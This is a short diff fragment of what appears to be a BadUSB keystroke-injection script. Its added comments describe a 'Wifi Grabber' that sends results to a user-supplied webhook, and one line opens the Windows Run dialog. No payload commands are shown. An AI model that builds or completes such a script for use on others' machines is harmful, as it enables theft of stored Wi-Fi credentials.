@@ -1,6 +1,6 @@
+REM Script by Ayden
 
-
-
+REM Wifi Grabber Script replace the URL of the webhook by your
 
 
 GUI r
